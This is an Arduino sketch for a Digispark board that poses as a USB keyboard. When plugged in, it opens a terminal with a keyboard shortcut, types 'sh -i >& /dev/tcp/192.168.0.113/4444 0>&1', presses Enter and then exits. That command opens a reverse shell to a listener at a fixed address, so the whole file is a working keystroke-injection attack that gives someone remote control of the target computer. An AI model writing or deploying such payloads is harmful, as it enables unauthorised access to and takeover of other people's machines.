#include "DigiKeyboard.h"
void setup() {
}
void loop() {

  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);

  DigiKeyboard.sendKeyStroke(0x17,MOD_ALT_LEFT,MOD_CONTROL_RIGHT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println('sh -i >& /dev/tcp/192.168.0.113/4444 0>&1'); 
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboard.delay(100);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);



  for (;;) {
    /*empty*/
  }
}